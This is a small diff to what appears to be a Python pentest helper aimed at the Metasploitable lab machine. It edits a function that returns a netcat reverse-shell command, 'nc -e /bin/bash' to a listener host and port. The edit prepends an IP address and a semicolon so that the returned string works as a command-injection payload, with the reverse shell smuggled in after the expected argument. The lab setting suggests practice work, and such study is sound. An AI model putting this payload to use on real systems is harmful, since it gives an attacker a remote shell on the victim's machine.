@@ -15,4 +15,4 @@ def nc_reverse_shell(lhost: str, lport: int) -> str:
     """
     Variante Netcat (nc-traditional) – Metasploitable en dispose avec -e.
     """
-    return f"nc -e /bin/bash {lhost} {lport}"
+    return f"10.220.38.190; nc -e /bin/bash {lhost} {lport}"
